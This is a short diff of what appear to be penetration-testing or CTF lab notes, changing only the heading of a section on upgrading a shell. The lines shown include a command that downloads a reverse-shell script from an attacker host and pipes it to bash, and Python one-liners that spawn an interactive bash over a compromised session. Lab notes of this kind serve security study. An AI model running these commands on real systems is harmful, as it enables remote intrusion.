@@ -14,7 +14,8 @@ on remote machine call:
 curl 10.10.14.106/rev.sh|bash
 ```
 
-- upgrade shell to bash:
+###  upgrade shell
+
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
